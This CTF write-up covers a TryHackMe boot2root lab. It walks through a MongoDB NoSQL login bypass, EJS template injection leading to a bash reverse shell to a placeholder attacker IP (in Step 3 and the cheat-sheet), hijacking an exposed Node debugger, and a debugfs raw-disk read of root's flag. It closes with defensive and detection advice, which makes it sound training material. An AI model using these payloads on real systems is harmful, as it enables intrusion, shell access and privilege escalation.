## CTF Writeup — "Do Not Disturb" NoSQL → SSTI → Debugger Boot2Root (TryHackMe)
### TryHackMe · Hacker Holidays Day 7 · Web / Boot2Root · Medium (90 pts) · NoSQL auth bypass → EJS SSTI → Node debugger → raw-disk read

**User flag:** `THM{REDACTED}`
**Root flag:** `THM{REDACTED}`

---

## TL;DR

Four vulnerabilities chained. A **NoSQL injection** bypasses the login without a
password. The staff page has a "preview" feature that renders your text as an
**EJS template** — server-side template injection → RCE → shell as `poolside`
(user flag). A second user runs a Node process with the **`--inspect` debugger
exposed**; attaching to it gives code execution as that user, who is in the `disk`
group — so **`debugfs` reads the root flag straight off the raw disk**, bypassing
file permissions.

---

## The attack chain

```
Login rejects every credential; /staff returns 403 to everyone (session-gated)
        │
        ▼
NoSQL injection: password[$ne]=1  →  302 + session cookie  →  into /staff
        │
        ▼
/staff "preview" renders EJS templates server-side  →  SSTI
        │
        ▼
SSTI → child_process → reverse shell as 'poolside'  →  USER FLAG
        │
        ▼
ps aux: user 'pipelinesvc' runs node --inspect=127.0.0.1:9229
        │
        ▼
Attach the debugger  →  code execution as pipelinesvc (in the 'disk' group)
        │
        ▼
debugfs reads /root/root.txt off the raw partition  →  ROOT FLAG
```

Maps to the briefing: "a session goes warm, a stranger sits down in it" (auth
bypass), "a shell on the beach answers back" (SSTI RCE), "a wallet signs a
transaction its owner didn't authorise" (hijacking the pipelinesvc process), and
the root flag itself ("raw disk access was too much").

---

## Background: the four ideas you need

- **NoSQL injection.** When a login uses MongoDB, the query is roughly "find a user
  WHERE username = X AND password = Y." Mongo lets you send **operators** instead of
  plain values. `password[$ne]=1` becomes `{password: {$ne: "1"}}` — "password not
  equal to 1" — which is true for essentially every user, so the check passes
  without knowing the real password.
- **SSTI (Server-Side Template Injection).** A template engine (EJS here) fills in
  blanks like `<%= name %>`. But `<%= ... %>` **evaluates JavaScript on the
  server.** If the app renders *your* template, your JavaScript runs on their
  machine.
- **Node `--inspect` debugger.** This flag turns on Node's debugger. A debugger can
  pause a program and *run arbitrary code inside it* — and that code runs **as the
  process's user.** Leaving it on in production is remote code execution by design.
- **The `disk` group.** A user in the `disk` group can read the **raw disk device**.
  `debugfs` reconstructs files directly from raw disk blocks, **bypassing the
  filesystem's permission checks** — so you can read `/root/root.txt` without being
  root.

## Scope note

THM-provisioned target, worked from the THM attackbox inside their network.

## Step 1 — Recon

```bash
nmap -sC -sV -p22,80 $IP
```

- **22** SSH (publickey only — no passwords, so not the way in).
- **80** HTTP, `X-Powered-By: Express` → a **Node.js** app.

Only four routes exist: `/` (login), `/login`, `/logout`, and `/staff` — which
returns **403 to everyone, identical response regardless of credentials.** That
identical-for-all 403 is the key clue: `/staff` is gated on a **session**, and
nobody has one yet. (The login rejects every literal credential; no password is the
answer.)

## Step 2 — Foothold part 1: NoSQL authentication bypass

> **The lesson (and where I initially went wrong):** when a Node app's login
> uniformly rejects every credential, test **NoSQL operator injection early**. I
> lost a lot of time on credential guessing and a false "HTTP Basic Auth" theory
> before landing on this. (A note on that trap: the tool `hydra`'s `http-get`
> module treats *any* non-401 response as "success" — and `/staff` returns 403 —
> so it reported false-positive "cracked" passwords for every username. Confirm a
> cracked credential actually changes the response before trusting it.)

The injection, as URL-encoded form data (the `[$ne]` syntax is what makes
Express+Mongo parse it as an operator):

```bash
curl -s -i -c cookie.txt -X POST "http://$IP/login" \
  -d 'username=attendant&password[$ne]=1'
```

- `-c cookie.txt` saves whatever session cookie we get back.
- `password[$ne]=1` → `{password: {$ne: "1"}}` = "password not equal to 1" → matches
  the user.

Response:

```
HTTP/1.1 302 Found
Location: /staff
Set-Cookie: connect.sid=<session>; Path=/; HttpOnly
```

A **302 to /staff with a real session cookie** — bypass successful. Use it:

```bash
curl -s -b cookie.txt "http://$IP/staff"
```

Now `/staff` returns the **"Cabana Desk" staff console**, signed in as `attendant`.

## Step 3 — Foothold part 2: EJS Server-Side Template Injection

The console posts a `template` field to `/staff/preview`, and the label says *"EJS
— use `<%= guest %>`."* The app renders our template server-side → SSTI → RCE.

Confirm it evaluates:

```bash
curl -s -b cookie.txt -X POST "http://$IP/staff/preview" \
  --data-urlencode 'template=<%= 7*7 %>'
# → 49  ⇒ the server calculated it, so it's running our input as code
```

Escalate to a shell. EJS runs in Node, so reach `child_process` (in this context
`require` isn't global — reach it via `process.mainModule.require`):

```bash
nc -lvnp 4444        # attacker box
curl -s -b cookie.txt -X POST "http://$IP/staff/preview" \
  --data-urlencode 'template=<%= global.process.mainModule.require("child_process").execSync("bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1\"") %>'
```

Shell lands as **`poolside`**. Stabilise:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

## Step 4 — User flag

```bash
cat /home/poolside/user.txt
# THM{REDACTED}
```

## Step 5 — Privesc: hijack the pipelinesvc Node debugger

Look at running processes and who owns them:

```bash
ps aux | grep -iE 'processor.js|inspect|9229' | grep -v grep
# pipelinesvc  599  /usr/bin/node --inspect=127.0.0.1:9229 processor.js
ss -tlnp | grep 9229
# LISTEN 127.0.0.1:9229
```

A **different, more privileged user** (`pipelinesvc`) runs a Node app with the
**debugger open on 127.0.0.1:9229.** Attach to it — this gives a REPL executing
inside that process, i.e. as `pipelinesvc`:

```bash
node inspect 127.0.0.1:9229
# at the debug> prompt:
repl
# in the repl:
process.getuid()                                             # → 995 (pipelinesvc)
```

## Step 6 — Root flag: debugfs raw-disk read

Find the root partition (`/proc/partitions` always works, no perms needed):

```javascript
process.mainModule.require('child_process')
  .execSync('ls -la /dev/nvme* 2>/dev/null; cat /proc/partitions').toString()
```

The output shows `/dev/nvme0n1p1` as `brw-rw---- root disk` — a block device
readable by the **`disk` group**, which `pipelinesvc` belongs to. `debugfs` parses
the ext4 filesystem directly from raw disk blocks, bypassing file permissions:

```javascript
process.mainModule.require('child_process')
  .execSync('debugfs -R "cat /root/root.txt" /dev/nvme0n1p1 2>&1').toString()
```

```
THM{REDACTED}
```

**Rooted.**

---

## Root cause summary

- **NoSQL injection** — login built a Mongo query from unsanitised input; `{$ne:
  null}` bypasses auth.
- **SSTI** — user-supplied EJS templates rendered server-side → RCE.
- **Exposed Node inspector** — `--inspect` reachable by any local user grants a REPL
  in a privileged process.
- **`disk` group** — membership allows raw block-device read, and `debugfs` turns
  raw-disk read into arbitrary file read, defeating permissions on `/root/root.txt`.

## Defensive takeaways

- **NoSQL injection** — validate/cast input types; reject objects where strings are
  expected (`typeof password === 'string'`).
- **SSTI** — never render user input as a template; if unavoidable, use a
  logic-less/sandboxed engine and escape strictly.
- **Node `--inspect`** — never enable on a production service; it is RCE by design.
- **`disk` group** — membership is effectively root; treat `disk`, `docker`, `lxd`,
  `shadow` as root-equivalent and never grant them to service accounts.

## Detection opportunities

- **NoSQL injection** — log login bodies where a field is an object/array not a
  string; alert on `$ne`/`$gt`/`$regex` reaching the auth query.
- **SSTI/RCE** — `node → bash/sh` is a high-signal parent-child anomaly.
- **Debugger abuse** — alert on connections to an `--inspect` port, or better, on
  `--inspect` being present in a production process's args at all.
- **Raw-disk read** — `debugfs`/`dd` against a partition by a non-root process is
  anomalous; auditd on `open` of `/dev/nvme*`.

## Command cheat-sheet

```
# NoSQL auth bypass
curl -s -i -c cookie.txt -X POST "http://$IP/login" -d 'username=attendant&password[$ne]=1'
curl -s -b cookie.txt "http://$IP/staff"

# confirm + weaponise SSTI
curl -s -b cookie.txt -X POST "http://$IP/staff/preview" --data-urlencode 'template=<%= 7*7 %>'
curl -s -b cookie.txt -X POST "http://$IP/staff/preview" \
  --data-urlencode 'template=<%= global.process.mainModule.require("child_process").execSync("bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"") %>'

# find + attach the node inspector
ps aux | grep inspect ; ss -tlnp | grep 9229
node inspect 127.0.0.1:9229   →   repl   →   process.mainModule.require('child_process').execSync('id').toString()

# root flag via raw-disk read
process.mainModule.require('child_process').execSync('debugfs -R "cat /root/root.txt" /dev/nvme0n1p1 2>&1').toString()
```

## Two things worth remembering

1. **A 403 that's identical for every credential means the gate wants a *session*,
   not a *password*.** Don't grind credentials — find how a session is issued (here,
   NoSQL operator injection). On a Node/Mongo stack, try `[$ne]` early.
2. **Certain Linux groups are secretly root-equivalent.** `disk`, `docker`, `lxd`,
   `shadow` all reach root's data or powers. When you land as a user, check `id`
   first — group membership is often the whole privilege escalation.

*Target and users are fictional challenge material; all actions against the
THM-provisioned machine from the THM attackbox.*
